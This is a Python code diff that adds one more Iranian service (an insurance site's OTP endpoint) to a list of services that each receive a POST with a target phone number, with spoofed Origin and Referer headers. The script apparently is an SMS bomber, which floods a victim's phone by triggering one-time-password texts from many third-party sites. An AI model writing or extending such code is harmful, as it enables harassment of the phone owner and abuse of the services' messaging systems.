@@ -120,6 +120,14 @@ def didar24(phone):
         print(f"Error: {e}")
         return False
 
+def ibime(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://api.ibime.com/web/v1/account/otp", json={"phoneNumber": phone}, headers={"Origin": "https://ibime.com", "Referer": "https://ibime.com/"}, timeout=10)
+        print(f"STATUS: {r.status_code} | HEADERS: {dict(r.headers)} | TEXT: {r.text}")
+        return r
+    except Exception as e:
+        print(f"Error: {e}")
 
 
         
@@ -127,7 +135,7 @@ def didar24(phone):
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime
 ]
 
 # ==========================
